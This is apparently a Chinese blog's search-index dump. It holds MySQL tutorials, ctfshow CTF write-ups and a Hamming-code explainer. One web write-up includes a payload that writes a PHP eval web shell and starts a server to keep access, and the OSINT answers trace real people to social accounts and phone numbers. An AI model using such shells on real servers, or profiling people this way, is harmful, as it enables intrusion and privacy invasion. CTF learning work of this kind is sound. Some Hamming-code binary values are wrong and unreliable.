二哈   | 1996-12-01 | 49973c3a8ab362ad |\n+----+--------+------------+------------------+\n2 rows in set (0.00 sec)\n```\n\n导入txt\n```\nMariaDB [test]> load data local infile '/root/sql.txt' into table sj fields terminated by ','(ID,Name,Day,@p) set Password=md5(@p);\nQuery OK, 2 rows affected, 2 warnings (0.00 sec)\nRecords: 2  Deleted: 0  Skipped: 0  Warnings: 2\n```\n\n结果\n```\nMariaDB [test]> select * from sj;\n+----+--------+------------+------------------+\n| ID | Name   | Day        | Password         |\n+----+--------+------------+------------------+\n|  1 | w      | 1999-11-07 | f1290186a5d0b1ce |\n|  2 | 二哈   | 1996-12-01 | 49973c3a8ab362ad |\n|  3 | 张三   | 2000-01-02 | 01d7f40760960e7b |\n|  4 | 李四   | 2001-06-15 | e10adc3949ba59ab |\n+----+--------+------------+------------------+\n4 rows in set (0.00 sec)\n```\n\n命令解释\n`load data local infile '/root/sql.txt'`  //加载本地sql.txt文件\n`into table sj`   //导入sj这个表\n`fields terminated by ','`  //指明txt中分割数据的符号\n`(ID,Name,Day,@p) set Password=md5(@p);`  //字段名，md5(@p)表示md5加密前面定义的@p字段的内容\n\n","tags":["基础知识","mysql"],"categories":["mysql"]},{"title":"mysql从入门到入土（二）","url":"/posts/74c2ef78/","content":"\n\n\n# 用户操作 #\n\n## 创建用户 ##\n```\nCREATE USER 'username'@'host' IDENTIFIED BY 'password';\n```\n>username - 你将创建的用户名,\n>host - 指定该用户在哪个主机上可以登陆,如果是本地用户可用localhost, 如果想让该用户可以从任意远程主机登陆,可以使用通配符%.\n>password - 该用户的登陆密码,密码可以为空,如果为空则该用户可以不需要密码登陆服务器.\n\n例子：\n```\ncreate user 'm23100'@'localhost' identified BY '123456';\ncreate user 'm23100'@'192.168.1.101' identified BY '123456';\ncreate user 'm23100'@'%' identified BY '123456';\ncreate user 'm23100'@'%' identified BY '';\ncreate user 'm23100'@'%';\n```\n\n## 删除用户 ##\n```\nDROP USER 'username'@'host';\n```\n\n## 查看用户信息 ##\n```\nselect user,host,password from mysql.user;\n```\n可以在系统表`user`中看到所用用户信息\n因为字段太多，所以只查看`user`，`host`，`password`字段\n\n\n## 赋予用户权限 ##\n```\nGRANT PRIVILEGES ON DATABASENAME.TABLENAME TO 'username'@'host';\n```\n>privileges - 用户的操作权限,如SELECT , INSERT , UPDATE 等.如果要授予所的权限则使用ALL.;\n>databasename - 数据库名,\n>tablename-表名,如果要授予该用户对所有数据库和表的相应操作权限则可用 * 表示, 如 *.*\n\n例子：\n```\nGRANT SELECT, INSERT ON test.user TO 'm23100'@'%';\nGRANT ALL ON *.* TO 'm23100'@'%';\nflush privileges; 刷新权限\n```\n\n注意:用以上命令授权的用户不能给其它用户授权,如果想让该用户可以授权,用以下命令:\nGRANT privileges ON databasename.tablename TO 'username'@'host' with grant option;\n\n## 查看用户权限 ##\n```\nshow grants for 'user01'@'%';\n```\n\n## 回收用户权限 ##\n```\nREVOKE DELETE ON *.*  FROM 用户名@’%’;             -- 回收部分权限\nREVOKE ALL PRIVILEGES ON *.* FROM 用户名@’%’;             -- 回收所有权限\n```\n\n\n# 密码操作 #\n## 数据库内修改用户密码 ##\n### root修改其他用户密码 ###\n```\nset password for 'user01'@'%'=password('Qwer1234');\n```\n\n### 普通用户修改自己密码 ###\n```\nset password=password('123456');\n```\n\n## 数据库外修改密码 ##\n```\nmysqladmin -u root -p原密码 password 修改的密码\n```\n","tags":["基础知识","mysql"],"categories":["mysql"]},{"title":"mysql从入门到入土（一）","url":"/posts/44d403a0/","content":"\n\n# 环境 #\ncentos7，mariadb5.5.56\n\n\n# 数据库基础操作 #\n\n## 查看数据库 ##\n默认有四个库\n```\nMariaDB [(none)]> show databases;\n+--------------------+\n| Database           |\n+--------------------+\n| information_schema |\n| mysql              |\n| performance_schema |\n| test               |\n+--------------------+\n4 rows in set (0.00 sec)\n```\n## 创建数据库 ##\naab是数据库的名字\n```\nMariaDB [(none)]> create database aab;\nQuery OK, 1 row affected (0.00 sec)\n```\n\n## 切换（使用）数据库 ##\n切换至aab数据库\n```\nMariaDB [(none)]> use aab;\nDatabase changed\nMariaDB [aab]>\n```\n\n## 删除（丢弃）数据库 ##\ndrop database [if exists] 数据库名;\nif exists 为可选，判断是否存在，如果不存在则会抛出异常\n```\nMariaDB [(none)]> drop database if exists aab;\nQuery OK, 0 rows affected (0.00 sec)\n```\n\n# 表基础操作 #\n\n## 查看表 ##\n因为目前还没有表，所以返回了empty set\n```\nMariaDB [aab]> show tables;\nEmpty set (0.00 sec)\n```\n\n## 创建表 ##\ncreate table 表格名(列名1 类型，列名2 类型，列名3 类型);\n```\nMariaDB [aab]> create table bba(Sid int,Sname char(6),Sdate date);\nQuery OK, 0 rows affected (0.00 sec)\n```\n扩展---常用数据类型\n>整数型：tinyint, smallint, mediumint, int, bigint\n>小数型：float, double, decimal, real\n>字符型：char, varchar\n>日期时间型： date, datetime, time, timestamp, year\n>备注型：tinytext, text, mediumtext, longtext\n\n扩展---char与varchar的区别\n>首先明确的是，char的长度是不可变的，而varchar的长度是可变的，定义一个char[10]和varchar[10],如果存进去的是‘abcd’,那么char所占的长度依然为10，除了字符‘abcd’外，后面跟六个空格，而varchar就立马把长度变为4了，取数据的时候，char类型的要用trim()去掉多余的空格，而varchar是不需要的。\n\n>char的存取数度还是要比varchar要快得多，因为其长度固定，方便程序的存储与查找；但是char也为此付出的是空间的代价，因为其长度固定，所以难免会有多余的空格占位符占据空间，可谓是以空间换取时间效率，而varchar是以空间效率为首位的。char的存储方式是，对英文字符（ASCII）占用1个字节，对一个汉字占用两个字节；而varchar的存储方式是，对每个英文字符占用2个字节，汉字也占用2个字节，两者的存储数据都非unicode的字符数据。\n\n\n\n## 查看表结构 ##\nshow columns from 表名;\n```\nMariaDB [aab]> show columns from bba;\n+-------+---------+------+-----+---------+-------+\n| Field | Type    | Null | Key | Default | Extra |\n+-------+---------+------+-----+---------+-------+\n| Sid   | int(11) | YES  |     | NULL    |       |\n| Sname | char(6) | YES  |     | NULL    |       |\n| Sdate | date    | YES  |     | NULL    |       |\n+-------+---------+------+-----+---------+-------+\n3 rows in set (0.00 sec)\n```\n\n## 删除表 ##\ndrop table [if exists] 表名;\nif exists 为可选，判断是否存在，如果不存在则会抛出异常\n>注意：删除具有主外键关系的表时，要先删子表(从表)，后删主表\n```\nMariaDB [aab]> drop table bba;\nQuery OK, 0 rows affected (0.00 sec)\n```\n","tags":["基础知识","mysql"],"categories":["mysql"]},{"title":"【ctfshow】月饼杯(第二届)-wp","url":"/posts/34a884e6/","content":"\n技术有限，只解出部分题目\n睡觉前还是前10的，一觉醒来就没了，呜呜呜:(\n\n# CRYPTO #\n\n## 我的木头啊！！！ ##\n根据提示为栅栏加密\n但不是普通的栅栏，而是W型\n解出来后就是base全家桶了\n![](/img/ctfshow/ybb-1.png)\n\n## 一封信 ##\n[网站](https://aghorler.github.io/emoji-aes/)直接一把梭，密钥在题目中\n![](/img/ctfshow/ybb-2.png)\n\n\n# MISC #\n\n## 杂项签到 ##\n在图片的最后有一串base64加密的字符串，解码即可\n\n## 有手就行 ##\n图片备注中得到关键信息\n![](/img/ctfshow/ybb-3.png)\n汉明码不会算\n[参考文章](https://blog.csdn.net/qq_19782019/article/details/87452394)\n\n## HelloFlag ##\n第一次做这种区块链的题目\n感觉是非预期了\n首先下载MetaMask这个插件\n打开网址\n![](/img/ctfshow/ybb-4.png)\n将地址替换为题目中的\n![](/img/ctfshow/ybb-5.png)\n点这个（我瞎点的）\n![](/img/ctfshow/ybb-6.png)\n查看更多信息\n![](/img/ctfshow/ybb-7.png)\n转成UTF-8就能看到flag了\n![](/img/ctfshow/ybb-8.png)\n\n\n## project Tao-1 ##\n太套了吧\nlog中并没有任何有用的信息就不放出来了\n第零关：/W4lc0me  没啥好说的，直接下一关\n第一关：/Letsstart 源码里有\n第二关：/some_informations 根据提示找到错误，那就是去掉s\n第三关：/some_information 有色块，转成ascii`G0od! Next /CTFG0d`\n第四关：/CTFG0d 有一串加密字符串，先base64-->base16-->base64-->base32,得到`ecalptx4N/` 反转一下`/N4xtplace`\n第五关：/N4xtplace 源代码中的颜文字aaencode解密一下\n第六关：/cftla5gsh0w title的提示去掉flag\n第七关：/ct5sh0w 源码中有一张二维码，修复一下\n第八关：/t308g0d 一张图片，下载后改高度（原来crc没报错的情况下高度不一定正确（8神说高度和IHDR块的CRC都被改了））\n\n\n## project Tao-2 ##\n第九关：/DEADSOUL\n就是第八关的图片名字\n\n第十关：/HIRE\n提示知乎彩蛋\n在console可以找到\n![](/img/ctfshow/ybb-9.png)\n\n\n第十一关：/about_baidu\nlog提示说访问图片\n找到图片的RGB值和alpha值（就是ps中灰度滑块的值）\n即14.215.117.35，访问是百度首页\n![](/img/ctfshow/ybb-10.png)\n根据提示找到地址\n![](/img/ctfshow/ybb-11.png)\n\n\n第十二关：/ns\n在地图上将诗句中的地名连接起来\n组成两个字母ns\n\n第十三关：/ONLY2GAME\n根据log，发现是莫斯密码\n将SAYL7UNIT用莫斯加密\n然后-和.互换再次解密\n\n\n第十四关：/TAOFINAL\n5bit编码——>博多密码\n[在线解码](https://www.boxentriq.com/code-breaking/baudot-code)\n将.换成0，-换成1\n\n最终：flag在图片最后面\n\n\n## 月饼起义 ##\n第一次出题目，有点激动，哈哈哈\n感谢@rot的出题协助\n\n1：首先下载，得到一个压缩包，但是不能直接解压，是损坏的\n可以看到有一个hint.txt\n![](/img/ctfshow/ybb-12.png)\n尝试用binwalk分离\n![](/img/ctfshow/ybb-13.png)\n查看这个文本\n![](/img/ctfshow/ybb-14.png)\n是零宽隐写\n解出来一个hint：170，\n哎但是暂时没啥用\n![](/img/ctfshow/ybb-15.png)\n\n2：再回去查看压缩包\n会发现中间隐藏了一个文件\n![](/img/ctfshow/ybb-16.png)\n![](/img/ctfshow/ybb-17.png)\n提取出来后异或之前得到的数值170\n脚本如下：\n```\nf=open(\"data\",\"rb\")\nd=f.read(9999999)\ne=\"\"\nfor i in d:\n    e=e+chr(ord(i)^170)\nf=open(\"data_xor\",\"wb\")\nf.write(e)\nf.close()\n```\n观察到有89 50 4e 即png图片头\n![](/img/ctfshow/ybb-18.png)\n逆序脚本：\n```\nf=open(\"data_xor\",\"rb\")\nd=f.read(9999999)\nd=d[::-1]\nf=open(\"flag.png\",\"wb\")\nf.write(d)\nf.close()\n```\n然后使用stegsolve 查看通道信息\n![](/img/ctfshow/ybb-19.png)\n得到最终的flag图片\n\n# OSINT #\n\n## 幸福小镇 ##\n百度百科可以看到所有信息，角色，配音等都在里面\n![](/img/ctfshow/ybb-20.png)\n\n## PS打卡第一天 ##\n先改后缀为psd\n把4张图片导出\n百度识图搜冬天这张\n![](/img/ctfshow/ybb-21.png)\n看到了域名为兰州大学\n直接交试试看，没想到真是兰州大学\n![](/img/ctfshow/ybb-22.png)\n\n\n## 抬头看看 ##\n直接老朋友谷歌识图\n找到几篇新闻，都是近期发生的\n![](/img/ctfshow/ybb-23.png)\n在新闻中得到关键信息The lvy餐厅\n![](/img/ctfshow/ybb-24.png)\n谷歌地图\n![](/img/ctfshow/ybb-25.png)\n实景看看\n嗯，一模一样，剩下的就不说了\n![](/img/ctfshow/ybb-26.png)\n\n## 以卵击石 ##\n通过百度识图得到的图片猜测大概是个柠檬的外表\n直接在b站搜\n一个一个看\n![](/img/ctfshow/ybb-27.png)\n拿到制作的视频（甜点的售价_内层馅料的种数都在视频中）\n通过评论区的关键词（请吃饭，蹭饭），翻看“雨哥到处跑”和“力元君”的往期视频，可以发现有一期（蹭饭挑战）提到了这个柠檬\n![](/img/ctfshow/ybb-28.png)\n拿到视频号\n![](/img/ctfshow/ybb-29.png)\n组合一下就好啦\n\n## 我的朋友 ##\n暴打出题人，啊啊啊啊\n这一题我前前后后做了4个小时左右，一直组合不对，最后发现顺序错了\n根据提示，猜测人物为LOL的解说\n![](/img/ctfshow/ybb-30.png)\nlol解说大部分活跃在微博\n直接微博搜索`英雄联盟主持人`\n得到几个人物（余霜，小钰，骆歆）\n![](/img/ctfshow/ybb-31.png)\n在她们的微博中翻与图片一致的衣服\n最后在骆歆的微博中找到了时间，战队等信息\n![](/img/ctfshow/ybb-32.png)\n搜一下赛程表\n![](/img/ctfshow/ybb-33.png)\n在搜战绩\n![](/img/ctfshow/ybb-34.png)\n接着是第二场比赛\n![](/img/ctfshow/ybb-35.png)\n战绩\n![](/img/ctfshow/ybb-36.png)\n组合在一起\n\n## 套套去哪儿 ##\n根据提供的信息（2021年6月3号下午和图片中的机型B-6467）\n在飞常准app中可以查到如下信息\n西藏航空 TV9817 13:00-15:30 拉萨贡嘎T2-泸州云龙\n西藏航空 TV9817 13:00-17:55 拉萨贡嘎T2-太原武宿T1\n西藏航空 TV9817 16:00-17:55 泸州云龙-太原武宿T1\n\n深圳航空 ZH3721 13:00-15:20 拉萨贡嘎T2-泸州云龙\n深圳航空 ZH3721 13:00-17:55 拉萨贡嘎T2-太原武宿T1\n深圳航空 ZH3721 16:00-17:55 泸州云龙-太原武宿T1\n\n长龙航空 GJ5039 13:00-15:20 拉萨贡嘎T2-泸州云龙\n长龙航空 GJ5039 13:00-17:55 拉萨贡嘎T2-太原武宿T1\n长龙航空 GJ5039 16:00-17:55 泸州云龙-太原武宿T1\n\n接下来就不会了，然后一个一个航班查，一个一个城市试，结果还真蒙对了\n\n## 见字如面 ##\n赛后做出来的\nhint1:想想是哪些人收到信呢，信字加粗一下\nhint2:以写信收藏体育娱乐以及其他明星为主\n真没有想到在贴吧，学废了\n![](/img/ctfshow/ybb-37.png)\n百度识图得到人物名字：山姆\n在吧内搜索\n![](/img/ctfshow/ybb-38.png)\n在他的其他帖子里找到了qq\n\n\n# web #\n\n## web签到 ##\nMD5等于自身，如md5($a)==$a,php弱比较会把0e开头识别为科学计数法，结果均为0，所以此时需要找到一个MD5加密前后都是0e开头的，如0e215962017\n![](/img/ctfshow/ybb-39.png)\n\n## 不要离开我 ##\n在可写的/tmp目录下传木马并写系统命令，然后提交5秒内进⾏check，check会关闭nginx和php-fpm，由于是www-data权限，⽆法启动nginx和php-fpm，直接启动php内置服务器即可\n```\ncmd=file_put_contents(\"/tmp/index.php\",\"<?php eval(\\$_POST['a']);?>\");system(\"sleep 5 && php -S 0.0.0.0:80 -t /tmp/\");\n```\n注意特殊字符编码\n传入后可以在蚁剑看看有没有成功写入php\n![](/img/ctfshow/web入门/权限维持1.png)\nflag在根目录\n（出现`Notice: Undefined index: a in /tmp/index.php on line 1`是正常情况）\n![](/img/ctfshow/web入门/权限维持2.png)","tags":["wp","ctfshow"],"categories":["wp"]},{"title":"【ctfshow】网络迷踪-wp","url":"/posts/4ef561fb/","content":"\n\n# 前言 #\n\n使用到的工具\n1：[百度识图](https://graph.baidu.com/pcpage/index?tpl_from=pc)\n2：[谷歌识图](https://images.google.com/?gws_rd=ssl)\n3：[经纬度定位](https://www.qvdv.com/tools/qvdv-coordinate.html)\n4：[yandex识图](https://yandex.com/images/)\n\n# 新手上路 #\n格式：ctfshow{桥的名字}\n求的是桥的名字\n![](/img/ctfshow/wlmz/新手上路.jpg)\n\n谷歌识图得到结果为蜈支洲岛\n![](/img/ctfshow/wlmz/蜈支洲岛.png)\n\n使用百度实景地图查看岛\n岛屿不是很大，转一圈就看到了\nctfshow{情人桥}\n![](/img/ctfshow/wlmz/情人桥.png)\n\n# 初学乍练 #\n格式：ctfshow{目的地}\n可以得知是瑞航的飞机\n![](/img/ctfshow/wlmz/初学乍练.jpg)\n从wiki百科查看机场\n![](/img/ctfshow/wlmz/瑞士.png)\nctfshow{苏黎世}\n\n# 初学又练 #\n格式：ctfshow{纬度(精确到小数点后四位, 不用进位),经度(精确到小数点后四位, 不用进位)}\n可以看到右边店面的名字为：sandwichnsmoothies\n![](/img/ctfshow/wlmz/初学又练-1.png)\n因为在国外，所以直接用谷歌地图搜，用街景看，发现一模一样\n![](/img/ctfshow/wlmz/初学又练-2.png)\n真的不想做经纬度的题了，数字太难对了\nctfshow{55.6382,12.6411}\n\n# 初学再练 #\n格式：ctfshow{军事基地英文}\n谷歌识图\n直接得到结果\n![](/img/ctfshow/wlmz/初学再练.png)\nctfshow{Nagurskoye}\n\n# 现拉现吃 #\n格式：ctfshow{图中店铺全名的拼音（无分隔符和声调、字母全小写）加食物价格（阿拉伯数字）}\n百度识图找到一个图案一样的碗\n![](/img/ctfshow/wlmz/拉面.png)\n得到结果为“云峰清真餐厅(南滨河路店)”，因为图片上有大众点评的水印\n所以在大众点评里找，看到评论里有店面的招牌，得到名字为云峰牛肉面\n![](/img/ctfshow/wlmz/拉面-2.png)\n手机app扫码点单可以得知价格为10，但是提交失败\n百度得到的价格为17\nctfshow{yunfengniuroumian17}\n\n\n# 初窥门径 #\n格式：拍摄者后面的建筑名称，格式ctfshow{建筑名称中文}\nyandex识图找到类似的图片\n![](https://s4.ax1x.com/2021/12/11/oTGyVg.png)\n\n转到一篇游记,提到了城市吉萨\n![](/img/ctfshow/wlmz/初窥门径-2.png)\n之后也写到了拍摄地点\nctfshow{胡夫金字塔}\n\n\n# 狗哥去哪 #\n格式：flag为ctfshow{风景区名字，小写拼音}\n\n图片中有微博id，找到号主，翻看相册，没看到啥信息\n找到博主的B站号，看到一篇vlog，提到了地点\n![](/img/ctfshow/wlmz/狗哥去哪.png)\n\nctfshow{daochengyading}\n\n\n\n# 国足加油 #\n格式：ctfshow{日期+体育场名字}\n一个gif，使用百度识图搜索\n在这一篇[新闻](https://xw.qq.com/partner/hwbrowser/20200329a041qr/20200329a041qr00?adtag=hwb&pgv_ref=hwb&appid=hwbrowser&ctype=news)中可以得知日期为2016年3月29日,比赛地点为西安\n![](/img/ctfshow/wlmz/国足加油1.png)\n就差场地了，可以通过关键词来百度搜索\n得知场地为陕西省体育场\n![](/img/ctfshow/wlmz/国足加油2.png)\nctfshow{2016年3月29日陕西省体育场}\n\n\n# 致我超吧 #\n格式：ctfshow{主角ID_vs_对手id}（全小写）\n百度识图可以找到一篇知乎文章，提到了这是选手`innovation`的操作\n另一篇文章提到对手`dark`\n![](/img/ctfshow/wlmz/致我超吧.png)\nctfshow{innovation_vs_dark}\n\n\n# 山外有山 #\n格式：ctfshow{山的名字}\n说实话这个图我一眼就看出来了是珠穆朗玛峰\n但还是识图确认了一下\n![](/img/ctfshow/wlmz/珠穆朗玛峰.png)\nctfshow{珠穆朗玛峰}\n\n\n# 密集恐惧 #\n格式：提交图片所在地的经纬坐标，就网上公开的就成\n根据积累与特征直接看出是美国飞机坟场\n当然百度识图也能出\n![](/img/ctfshow/wlmz/密集恐惧-1.png)\nctfshow{32°09'19.17N,110°49'46.69W}\n\n\n\n# 哐啷哐啷 #\n格式：ctfshow{火车站名称}\n谷歌识图可以直接找到\n![](/img/ctfshow/wlmz/哐啷哐啷1.png)\nctfshow{和田}\n\n\n# 鲶鱼之谜 #\n格式：ctfshow{航班号_拍摄时分}，如ctfshow{ab1234_1537}（15时37分拍摄）\n这题大概是网络迷踪中最难的一题，直接放官网wp了：\n\npart1_航班号：\n根据照片水印可以找到微博主人，综合8月29号以及之前发的微博可以看出他一直居住在上海，往下翻就能找到这张照片出处，根据评论可以猜测出可能是回天津的航班，根据那条微博的其他照片和发布时间可以推测出航班的起飞时间为18点左右，再通过飞常准app可以查到2021.8.5的航班信息，然后根据飞机的座椅推算出乘坐的航班号为ca1524\n![](/img/ctfshow/wlmz/鲶鱼之谜-1.jpg)\n![](/img/ctfshow/wlmz/鲶鱼之谜-2.jpg)\n![](/img/ctfshow/wlmz/鲶鱼之谜-3.jpg)\n![](/img/ctfshow/wlmz/鲶鱼之谜-4.jpg)\n![](/img/ctfshow/wlmz/鲶鱼之谜-5.jpg)\n\n\npart2_拍摄时间：\n通过飞常准app可以找到航班实际起飞时间为18:27以及平均飞行速度为11.68km/min，而当天（2021.8.5）山东的日落时间为19:14:39，再结合上海到济南的直线距离816km左右可以得出，飞机到济南需要70min，此时已经日落了，也就是说，此时的飞机还没飞过济南，且位置在上海和济南之间。\n![](/img/ctfshow/wlmz/鲶鱼之谜-6.jpg)\n![](/img/ctfshow/wlmz/鲶鱼之谜-7.jpg)\n![](/img/ctfshow/wlmz/鲶鱼之谜-8.jpg)\n\n从日落时间19:14开始反推，根据飞机平均速度，在日落前大约能飞549km，以虹桥机场为圆心画一个半径549km的圆，再结合航线判断大概率在江苏上空，再用谷歌地球查看具体时刻的卫星图，可以推算出是在飞机起飞后十分钟之内拍摄的。\n![](/img/ctfshow/wlmz/鲶鱼之谜-9.jpg)\n![](/img/ctfshow/wlmz/鲶鱼之谜-10.jpg)\n![](/img/ctfshow/wlmz/鲶鱼之谜-11.jpg)\n![](/img/ctfshow/wlmz/鲶鱼之谜-12.jpg)\n\n从图片可以看出飞机稍微有些倾斜，说明飞机处于爬升阶段，再根据窗外的云层可以判断出此时飞机高度大约为6000米，再用飞常准app查看航线回顾，飞行高度为6000米时飞机位于南通市附近，且处于爬升状态，与之前的推断相吻合，再看具体时刻，大致为18:37，得到flag\n![](/img/ctfshow/wlmz/鲶鱼之谜-13.jpg)\n\nctfshow{ca1524_1837}\n\n# 这里有轨 #\n格式：提交车站名称和车次号，例如：ctfshow{上海T1234}\n百度搜列车型号相关文章，对比图片得到车型号为`CR400BF`\n![](/img/ctfshow/wlmz/这里有轨-1.jpg)\n\n识图找到站点千岛湖\n\n根据光线等，不可能是早上和晚上，剩下的爆破一下\n![](/img/ctfshow/wlmz/这里有轨-2.jpg)\n得到：\nctfshow{千岛湖G7498}\n\n\n# 爆破不了 #\n格式：ctfshow{拍摄者所处建筑的联系手机号}\n百度识图得到`泉州东西塔`\n![](/img/ctfshow/wlmz/爆破不了1.png)\n从照片上看，拍摄者距离景点很近\n还有图片中房子的走向\n可以排除镇国塔\n仁寿塔附近能拍摄的地方不多，基本就锁定了泉州等风民俗\n![](/img/ctfshow/wlmz/爆破不了2.png)\nctfshow{18050999086}\n\n\n# 目之所及 #\n格式：ctfshow{区号-电话}\n原图的经纬度没有去掉\n计算方式\n![](/img/ctfshow/wlmz/经纬度计算.png)\n得到大概位置为莆田市\n![](/img/ctfshow/wlmz/莆田.png)\n通过百度实景地图找到附近的标志性建筑（虽然我感觉不太像，这个角是平的，图里是尖的）\n![](/img/ctfshow/wlmz/目之所及.png)\n查看附近的景点\n根据看标志性建筑的角度，加上定位地点，应该是凤凰山公园\n查看电话号码\n![](/img/ctfshow/wlmz/凤凰山公园.png)\nctfshow{0594-2680716}\n\n# 窗外风景 #\n格式：ctfshow{目的城市+比赛地点+下一场比赛城市}\n\n\n\n# 来点福利 #\n格式：ctfshow{照片中女孩名字_当时住的酒店电话号码}\n百度识图得到比赛和人物名字\n![](/img/ctfshow/wlmz/来点福利-1.png)\n\n百度搜比赛地点\n![](/img/ctfshow/wlmz/来点福利-2.png)\n\n根据右上角招牌搜到电话\n![](/img/ctfshow/wlmz/来点福利-3.png)\n\nctfshow{郭敏善_1833-8855}\n\n\n# 你的名字 #\n大佬们都说能直接搜到\n但我搜了几圈都没找到，不知道是不是姿势不对\n这里直接借用了大佬的图片\n![](/img/ctfshow/wlmz/你的名字111.png)\nctfshow{野菜山下商店}\n\n\n# 严查外挂 #\n格式：'ctfshow{' + flag +'|' + link + '}'\nhint1: flag在举报帖子的图片上\nhint2: 链接地址不是缓存的网页，是直接访问的链接（404），末尾不带'/'\n百度关键词可以直接搜到那个404的页面`https://www.taptap.com/topic/6820231`\n![](/img/ctfshow/wlmz/严查外挂1.png)\n使用谷歌快照查看文章中的图片\n![](/img/ctfshow/wlmz/严查外挂2.png)\n得到flag\n![](/img/ctfshow/wlmz/严查外挂3.png)\n将网址和flag连接起来\nctfshow{flag{M1ssInG_T5p1N_P0Wer}|https://www.taptap.com/topic/6820231}\n\n\n# 附带导航 #\n。。。\n在群文件中。（群号：372619038）\n![](/img/ctfshow/wlmz/附带导航1.png)\nctfshow{勇敢炫炫，不怕困难}\n\n# 给你拷上 #\n格式：ctfshow{十位纯数字}\n百度识图找到人物名称\n![](/img/ctfshow/wlmz/给你拷上1.png)\n微博搜索\n![](/img/ctfshow/wlmz/给你拷上2.png)\nctfshow{1928665723}\n\n# 菜瞎双眼 #\n格式：ctfshow{比赛开始日期_比赛名_出题者中文id_原图片文件名_flag{xxxxxx}}\n这个好难搜\n翻到第九页才看到\n得到比赛名`红帽杯`\n![](/img/ctfshow/wlmz/菜瞎双眼1.png)\n搜索其他wp文章\n得到flag`flag{d7f1417bfafbf62587e0}`和原图片文件名`vegetable.png`\n在官网找到时间`2019-11-10`\n![](/img/ctfshow/wlmz/菜瞎双眼2.png)\nwp中出现了出题人的id：b1cx\n![](/img/ctfshow/wlmz/菜瞎双眼3.png)\n百度搜索b1cx,第一个github页面找到中文id`菠萝吹雪`\n![](/img/ctfshow/wlmz/菜瞎双眼4.png)\n组合在一起\nctfshow{2019-11-10_红帽杯_菠萝吹雪_vegetable.png_flag{d7f1417bfafbf62587e0}}\n\n# 童年回忆 #\n格式：ctfshow{动画片的名称}\n看右上角为bilibili独播\n![](/img/ctfshow/wlmz/童年回忆1.png)\n看画风是国产的\n在国产动画中搜索独家，找到一个造型一致的封面\n![](/img/ctfshow/wlmz/童年回忆2.png)\nctfshow{美影大乐园}\n\n# 我在哪呢 #\n。。图片放大，看到广州，常平，樟木头\n\nctfshow{东莞站}\n\n\n# 耳熟能详 #\n格式：ctfshow{音频出处}\n看样子是反转过的，我们利用软件反转回来\n![](/img/ctfshow/wlmz/耳熟能详1.png)\nqq识曲\n![](/img/ctfshow/wlmz/耳熟能详2.png)\nctfshow{玫瑰花的葬礼}\n\n# 传统小吃 #\n格式：ctfshow{区号-联系电话}\n老规矩先百度识图\n找到一张一模一样的\n![](/img/ctfshow/wlmz/传统小吃1.png)\n图片出自一篇游记\n找到了地址和店名\n![](/img/ctfshow/wlmz/传统小吃2.png)\n百度地图\n![](/img/ctfshow/wlmz/传统小吃3.png)\nctfshow{0595-22373358}\n\n\n# 宇宙大战 #\n格式：ctfshow{星系|战斗开始时间}\n百度识图\n有很多一模一样的图片，随便点一张\n![](/img/ctfshow/wlmz/宇宙大战1.png)\n找到日期和地点\n![](/img/ctfshow/wlmz/宇宙大战2.png)\nctfshow{2014-03-25|49-U6U}\n\n\n# 食堂轶闻 #\n格式：ctfshow{学校名称_锦旗落款日期}\n百度关键词搜索\n![](/img/ctfshow/wlmz/食堂轶闻1.png)\n得到学校名字\n![](/img/ctfshow/wlmz/食堂轶闻2.png)\n再次搜索\n![](/img/ctfshow/wlmz/食堂轶闻3.png)\n在贴吧中得到图片，拿到日期\n![](/img/ctfshow/wlmz/食堂轶闻4.png)\nctfshow{南方科技大学_2018_09}\n\n\n# 三秦套餐 #\n格式：ctfshow{所在地广场名称},如ctfshow{天安门广场}\n根据题目三秦和照片中的老潼关锁定陕西\n\n根据招牌百度得到广场名字\n![](/img/ctfshow/wlmz/三秦套餐.png)\n\nctfshow{金辉环球广场}\n\n# 古城豪庭 #\n格式：ctfshow{隔壁酒店电话}，ctfshow{区号-电话}\n\n缩小一点百度识图\n![](/img/ctfshow/wlmz/古城豪庭-1.png)\n\n百度搜西安民乐园文化街附近的酒店\n得到西安富力希尔顿酒店\n![](/img/ctfshow/wlmz/古城豪庭-2.png)\n\nctfshow{029-87388888}\n\n\n# 群欺出狱 #\n格式：图后面的山的名字和海拔 例如ctfshow{珠穆朗玛峰_635}\n\n直接百度地图可以直接找到位置\n![](/img/ctfshow/wlmz/群欺出狱-1.png)\n\n附近的几座山百度一下海拔\n\nctfshow{九华山_741}\n\n# Las Vegas历险记-1 #\n\n谷歌可以搜到原题\n\n![](/img/ctfshow/wlmz/juanwang-osint-lswjs-1.png)\n\nctfshow{36.171,-115.139}\n\n\n\n# Las Vegas历险记-2 #\n\n一点一点看视频比对就可以找到黄车了\n\n![](/img/ctfshow/wlmz/juanwang-osint-lswjs-2.png)\n\n\nctfshow{TUX&GOWN_36.1575,-115.1483}\n\n\n\n# Las Vegas历险记-3 #\n\n先找到车，然后观察周围环境，找到关键建筑（luxor金字塔，mgm酒店）\n谷歌地图很容易找到路口，但是还要注意时间节点是2017年\n\n![](/img/ctfshow/wlmz/juanwang-osint-lswjs-3-1.png)\n\n\nctfshow{Mandalay_Bay_Rd}\n\n\n\n# 红西秀林 #\n\n百度了半天，最后发现原剧中就有\n\n![](/img/ctfshow/wlmz/juanwang-osint-hxxl.png)\n\nctfshow{强仔咸鱼_13912345670_8233333}\n\n\n# 结语 #\n暂时写这么多吧，之后就不更新了。个人建议还是不要在这个模块上面花费太多精力\\^_\\^","tags":["wp","ctfshow"],"categories":["wp"]},{"title":"汉明码计算","url":"/posts/bf9bf50c/","content":"\n\n现在有一个二进制字符串：`10110110111`，我们要计算它的奇偶校验\n\n>汉明公式：2^n >= x + n + 1 (n为校验码位数 x为二进制字符串位数)\n\n>2^n >= 11 + n + 1\n\n所以得到`n=4`\n\n>校验码位置：2^i(i=0,1,2,…,校验码位数-1)\n\n得到校验码的位置为`1`，`2`，`4`，`8`,因此我们可以列出以下表格（红方框表示校验码位置）\n\n![](/img/linux/汉明码-1.png)\n\n然后将需要编码的二进制字符串填入表格中\n![](/img/linux/汉明码-2.png)\n\n\n接着将序号中二进制数第1位（从右往左数）为1、第2位为1、第3位为1、第4位为1的序号以次放入第1、2、3、4组\n\n>第1组：1(0011) 3(0011) 5(0101) 7(0111) 9(1001) 11(1011) 13(1101) 15(1111)\n>第2组：2(0100) 3(0011) 6(0110) 7(0111) 10(1010) 11(1011) 14(1110) 15(1111)\n>第3组：4(0100) 5(0101) 6(0110) 7(0111) 12(1100) 13(1101) 14(1110) 15(1111)\n>第4组：8(1000) 9(1001) 10(1010) 11(1011) 12(1100) 13(1101) 14(1110) 